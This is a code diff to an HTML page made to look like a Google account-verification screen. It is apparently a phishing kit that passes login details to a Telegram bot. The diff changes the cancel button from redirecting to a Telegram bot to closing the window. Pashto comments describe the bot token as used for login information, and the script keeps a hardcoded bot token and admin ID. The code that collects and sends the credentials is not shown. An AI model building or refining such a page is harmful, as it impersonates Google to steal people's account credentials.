@@ -117,7 +117,7 @@
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
         <div class="sub">Your account has been successfully verified!</div>
-        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Close & Return to Bot</button>
+        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Close Window</button>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -127,9 +127,7 @@
 </div>
 
 <script>
-    // ========== د بوټ لینک (ستاسو د بوټ سره بدل کړئ) ==========
-    const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
-    
+    // ========== د Telegram بوټ توکن (یوازې د لاګین معلوماتو لپاره) ==========
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
@@ -210,19 +208,14 @@
         }
     };
     
-    // د CANCEL تڼۍ - پاڼه بنده کوي او بوټ ته ځي
+    // د CANCEL تڼۍ - یوازې پاڼه بنده کوي (بوټ ته نه ځي)
     document.getElementById('cancelBtn').onclick = () => {
-        // بوټ ته لاړ شه
-        window.location.href = BOT_REDIRECT;
-        // پاڼه به بنده شي ځکه چې بوټ ته ځي
+        // هڅه وکړئ پاڼه بنده کړئ
+        window.close();
+        
+        // که window.close() کار ونکړي، کارونکي ته خبر ورکړئ
+        alert("Please close this window/tab manually.");
     };
-    
-    // د تلګرام ان-ویب براوزر لپاره اضافي
-    if (window.TelegramWebview && TelegramWebview.close) {
-        window.closeTelegram = function() {
-            TelegramWebview.close();
-        };
-    }
 </script>
 </body>
 </html>
